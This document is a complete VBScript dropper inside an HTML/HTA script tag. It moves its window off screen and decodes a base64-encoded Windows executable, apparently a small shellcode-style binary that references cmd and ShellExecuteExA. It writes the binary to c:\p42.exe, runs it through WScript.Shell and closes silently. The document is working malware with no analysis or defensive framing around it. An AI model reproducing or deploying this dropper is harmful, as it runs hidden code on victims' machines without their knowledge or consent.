<script language="vbs">
self.MoveTo 5000,5000
x=""
x=x&"TVqsNGeq4vq+fxJAAL8nEkAA6OYRAACJBlBQaI5ODuz/14leJIXSD4VNAQAAUGhI7oHd/9fpJgEAAAAA"
x=x&"QAAAAFBFAABMAQEAY29tbWFuZABjbWQA4AAPAQsBBwoABAAAAAAAAAAAAAAAEAAAABAAAAAgAAAAAEAA"
x=x&"ABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAACAAAAACAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAA"
x=x&"EAAAAAAAAAAAAAAAfxIAACgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
x=x&"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
x=x&"AAAAACA+IG51bAAvYyBkZWwgIAAAEAAAABAAAMsCAAAAAgAAAAAAAAAAAAAAAAAAIAAA4Gj2EUAAagBo"
x=x&"AQAfAP/ThcB1J2hFoORO/9fDx0YESABAAGjdEEAA6FIPAACNn8z///9TagDoRgAAAP82aHBz7zb/1//T"
x=x&"V1aNvogAAACJ+401NwFAAKWllqyEwHQDquL4jTUwAUAApaVeX/92BFPoDQAAAP82aH7Y4nP/12oA/9PG"
x=x&"Rkw8W1iJRmBYiUZcU8ZGUEDGRmgFjUZMUP9WKMMAAAAxyWa5bQK/EhBAAIn+6PDv//8PkXYnZw1nDWeY"
x=x&"tI9uZ2dnDgIfFwsIFQJnj2xnZ2dKAgoFAgMDDgkAZ4/4lpiYmFEP+/J9CZiwDScPZ3dnZ5gRbw1nmNHj"
x=x&"Z2dnmLQ3mFEPxg1av5iwDWeYEW8PuncnZzeY0eNnZ2eYtJhRD7r72hWYsFauPTY2NTUPZxBmZzaY0eNn"
x=x&"Z2eYtDeYUQ/KvmKpmLAPx+FmZzeYtJhRD57yWHyYsOoxUz41Npi05BlTSmjiHJiYmJhRD+Te0h+YsA1n"
x=x&"mNHjZ2dnmLSOyZeYmAfsG0ND6tgtZmdn6tA/Z2dnj2tnZ2cQDgkOCQITSQMLC2eYMUPuIW83D04jjzCY"
x=x&"sFauNjY2NjaYtO4hR5gRbw8uimgZmLBWrjY2NjaPRGdnZw8TExddSEgDCBAJCwgGA0kKCAgJFQ5JBAgK"
x=x&"SBcIF0kCHwJnN5i0N5gRbw+dIkicmLCgIX9jZ2dn6il/6jFzDWc2NQ9iZ2dHN5i0mFEPi/Bka5iwmBFz"
x=x&"DWeYtO4he5gRbw/sLIQ4mLDqKX89NpgRczc1mLSYUQ/CcGcbmLDq8KuYmJgNZw/nZ2dnDWUNZw1lD2dn"
x=x&"Zyc1mLQ3mFEPeB5tj5iw6il/DWc2mBFzmBF7N5i0mFEPnPCaaJiwPTWYtAZWp9dKpWNnJF07U1VJAh8C"
x=x&"ZzIxVrUDxldnZ2fipx9r7Cdr7Bd7yuwPb4xs7CdT7M/fZ2dnkLXujzk6pDc1MjEw7AtDe+wiW+wzYh9m"
x=x&"jewtf+w9R2aMhFUu7FPsZolWmJtWp8tfhxNgpqhqZqCMlVwbQ38Shuw9Q2aMAexrLOw9e2aM7HvsZoyM"
x=x&"ZVa8ODk6PT+lb2enEgAAUABAAO4BAAC/EgAApxIAAAAAAAAAAAAAAAAAAAAAAAAAAAAArRIAAAAAAABT"
x=x&"aGVsbEV4ZWN1dGVFeEEAU2hlbGwzMi5kbGwA"
function y(byval a)
        const m="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        dim b,c,d
        b=Len(a)
        for d=1 to b step 4
                dim e,f,g,h,i,j
                e=3
                i=0
                for f=0 to 3
                        g=mid(a,d+f,1)
                        if g="=" then
                                e=e-1
                                h=0
                        else
                                h=instr(m,g)-1
                        end if
                        i=64*i+h
                next
                i=hex(i)
                i=string(6-len(i),"0")&i
                j=chr(cbyte("&H"&mid(i,1,2)))+chr(cbyte("&H"&mid(i,3,2)))+chr(cbyte("&H"&mid(i,5,2)))
                c=c&left(j,e)
        next
        y=c
end function

d42="WScript.Shell"
p1342="c:\p42.exe"
set s=CreateObject("Scripting.FileSystemObject")
set f=s.createTextFile(p1342,true)
f.write y(x)
f.close
set tvis=CreateObject(d42)
tvis.run(p1342)
self.close
</script>